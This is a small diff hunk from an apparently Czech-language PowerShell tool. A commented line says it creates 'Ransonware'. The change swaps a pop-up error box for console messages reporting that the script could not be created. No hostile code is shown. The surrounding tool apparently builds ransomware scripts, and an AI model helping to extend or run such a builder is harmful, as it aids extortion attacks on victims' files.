@@ -109,7 +109,9 @@ Jméno souboru: $OutputName
     #Write-Host "$OutputName Ransonware vytvořen."
     }
     else {
-& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Něco se pokazilo... nelze vytvořit script.', 'ALE NÉÉÉÉÉ', 'OK', [System.Windows.Forms.MessageBoxIcon]::Information);}
+        Write-Host "ALE NEE... NECO SE POKAZILO"
+        Write-Host "---------------------------"
+        Write-Host "Script nemohl byt vytvoren z nejakeho duvodu D:"
     }
 }
 elseif ($confirm -eq "No"){
